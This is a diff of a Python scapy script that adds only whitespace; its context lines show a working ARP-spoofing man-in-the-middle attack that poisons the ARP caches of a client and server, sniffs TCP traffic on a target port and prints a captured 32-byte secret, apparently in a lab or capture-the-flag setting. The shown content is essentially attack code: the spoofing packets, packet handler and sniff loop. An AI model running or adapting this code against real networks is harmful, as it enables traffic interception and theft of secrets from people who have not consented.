@@ -6,10 +6,13 @@ import sys
 import threading
 import os
 
+
 attacker_mac = scapy.get_if_hwaddr("eth0")
+
 
 client_ip = "1.1.1.2"
 client_mac = "8a:54:54:b6:2b:41"
+
 
 server_ip = "1.1.1.3"
 server_mac = "e6:df:c0:23:e7:40"
@@ -24,6 +27,7 @@ client_source_port = None
 
 
 def arp_spoof():
+    
     print("[*] Starting ARP spoofing...")
     client_poison = scapy.Ether(dst=client_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=server_ip, hwsrc=attacker_mac, pdst=client_ip)
     server_poison = scapy.Ether(dst=server_mac, src=attacker_mac) / scapy.ARP(op=2, psrc=client_ip, hwsrc=attacker_mac, pdst=server_ip)
@@ -37,6 +41,7 @@ def arp_spoof():
 
 
 def handle_packet(pkt):
+    
     global current_secret, expected_seq, client_source_port, stop_sniffing, stop_spoofing
 
     if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.TCP) or (pkt[scapy.IP].src != client_ip and pkt[scapy.IP].src != server_ip) or (pkt[scapy.IP].dst != client_ip and pkt[scapy.IP].dst != server_ip) or (pkt[scapy.TCP].sport != target_port and pkt[scapy.TCP].dport != target_port):
@@ -54,6 +59,7 @@ def handle_packet(pkt):
             secret_bytes = bytes.fromhex(payload.decode())
 
             if len(secret_bytes) == 32:
+                
                 current_secret = payload.decode()
                 print(f"[+] Captured valid secret: {current_secret}")
 
@@ -112,12 +118,14 @@ def main():
     arp_thread.start()
 
     time.sleep(5)
+    
 
     print("[+] Starting packet sniffing...")
     print("[+] Waiting for secret exchange and command prompt...")
     bpf_filter = f"tcp port {target_port} and " f"(host {client_ip} or host {server_ip})"
 
     scapy.sniff(filter=bpf_filter, prn=handle_packet, store=0, iface=interface, stop_filter=lambda x: stop_sniffing)
+    
 
     if arp_thread.is_alive():
         stop_spoofing = True
